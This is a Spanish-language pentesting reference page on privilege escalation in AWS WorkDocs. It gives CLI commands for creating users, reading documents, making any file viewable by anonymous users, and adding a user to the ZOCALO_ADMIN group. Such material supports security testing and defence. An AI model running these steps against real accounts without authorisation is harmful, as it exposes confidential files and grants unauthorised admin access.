# AWS - WorkDocs Privesc

## WorkDocs

Para obtener más información sobre WorkDocs, consulte:

{% content-ref url="../aws-services/aws-directory-services-workdocs-enum.md" %}
[aws-directory-services-workdocs-enum.md](../aws-services/aws-directory-services-workdocs-enum.md)
{% endcontent-ref %}

### `workdocs:CreateUser`

Crea un usuario dentro del directorio indicado, luego tendrás acceso tanto a WorkDocs como a AD:

```bash
# Crear usuario (creado dentro de AD)
aws workdocs create-user --username testingasd --given-name testingasd --surname testingasd --password <password> --email-address name@directory.domain --organization-id <directory-id>
```

### `workdocs:GetDocument`, `(workdocs:`DescribeActivities`)`

Los archivos pueden contener información confidencial, léelos:

```bash
# Obtener lo que se creó en el directorio
aws workdocs describe-activities --organization-id <directory-id>

# Obtener lo que cada usuario ha creado
aws workdocs describe-activities --user-id "S-1-5-21-377..."

# Obtener archivo (se recuperará una URL para acceder con el contenido)
aws workdocs get-document --document-id <doc-id>
```

### `workdocs:AddResourcePermissions`

Si no tienes acceso para leer algo, simplemente puedes otorgarlo

```bash
# Agregar permiso para que cualquiera pueda ver el archivo
aws workdocs add-resource-permissions --resource-id <id> --principals Id=anonymous,Type=ANONYMOUS,Role=VIEWER
## Esto dará una identificación, el archivo será accesible en: https://<name>.awsapps.com/workdocs/index.html#/share/document/<id>
```

### `workdocs:AddUserToGroup`

Puedes hacer que un usuario sea administrador estableciéndolo en el grupo ZOCALO\_ADMIN.\
Para ello, siga las instrucciones de [https://docs.aws.amazon.com/workdocs/latest/adminguide/manage\_set\_admin.html](https://docs.aws.amazon.com/workdocs/latest/adminguide/manage\_set\_admin.html)

Inicie sesión con ese usuario en Workdoc y acceda al panel de administración en `/workdocs/index.html#/admin`

No encontré ninguna forma de hacer esto desde la CLI.
